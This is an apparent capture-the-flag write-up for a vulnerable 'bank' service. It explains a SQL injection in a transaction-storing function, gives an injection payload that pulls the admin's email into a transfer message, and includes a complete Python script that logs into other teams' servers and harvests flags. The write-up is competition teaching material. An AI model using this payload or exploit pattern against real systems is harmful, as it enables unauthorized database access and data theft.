Bank writeup
===========
### Vulnerability
There is a SQL injection vulnerability in bank system. \
The vulnerability originates from functions in `db/utils.py`: \
`get_account_num`,`get_balance`, and `store_transaction`. \
These functions can be spotted by diffing the source codes.

The first two functions seem hard to be exploited \
because the arguments are user IDs,\
and this leaves us one and only readily-feasible vulnerable function, \
`store_transaction`.

### Payload
The attack strategy is to insert the flag which resides in the email \
field of admin into transfer message so that we can check the flag in \
transaction history.
Therefore, we put the following payload in the transfer message:

```
',(SELECT email FROM user_table LIMIT 1)),0,0),(1,1,1,('1
```
which results in the following complete SQL query:
```sql
INSERT INTO `tran_table`(`from_account`, `to_account`, `remit`, `msg`,
    `from_balance`, `to_balance`)
VALUES(%s, %s, %s, concat ('[Transfer] ', '',(SELECT email FROM user_table
            LIMIT 1)),0,0),(1,1,1,('1'), %s, %s)
```

### Full Exploit Code
The following exploit code exploits all other teams' bank servers.
```python
# '^[A-za-z0-9\.\,_\(\)\' ]{,100}$'
import socket
import re

def recvuntil(s, data):
        p = ''
        while not p.endswith(data):
                p += s.recv(1)
        print p
        return p

ips = [None, None, "10.0.102.101", "10.0.103.101", "10.0.104.101", "10.0.105.101", "10.0.106.101"]
id_list = [None, None, "jmpark81", "jmpark81", "jjjkkk1", "jjjkim1", "jjjkkk1"]
pw_list = [None, None, "test1234", "test1234", "jjpass1", "jjpass1", "jjpass1"]

def attack(teamN):
        s = socket.socket(2, 1)
        s.connect((ips[teamN], 1588))
        recvuntil(s, "-> ")
        s.send("1\n")
        recvuntil(s, "Username -> ")
        s.send(id_list[teamN] + "\n") ##### ID
        recvuntil(s, "Password -> ")
        s.send(pw_list[teamN] + "\n") ##### PW
        recvuntil(s, "What would you like to do? -> ")
        s.send("3\n")

        recvuntil(s, "Receiver (user ID) -> ")
        s.send("admin\n")
        recvuntil(s, "Amount to transfer -> ")
        s.send("1\n")
        recvuntil(s, "Transfer message -> ")
        t = """',(SELECT email FROM user_table LIMIT 1)),0,0),(1,1,1,('1"""
        s.send(t+'\n')
        recvuntil(s, "Would you like to transfer? (Y/N) -> ")
        s.send("Y"+'\n')
        recvuntil(s, "Enter any key to return to the previous menu -> ")
        s.send('\n')

        recvuntil(s, "What would you like to do? -> ")
        s.send("2\n")
        flag = re.findall("\[Transfer\] (.{32})", recvuntil(s, "Enter any key to return to the previous menu -> "))[0]
        with open("flag_bank_team%d" % teamN, "wt") as f: f.write(flag)
        s.close()

for i in range(2,7):
        attack(i)
```
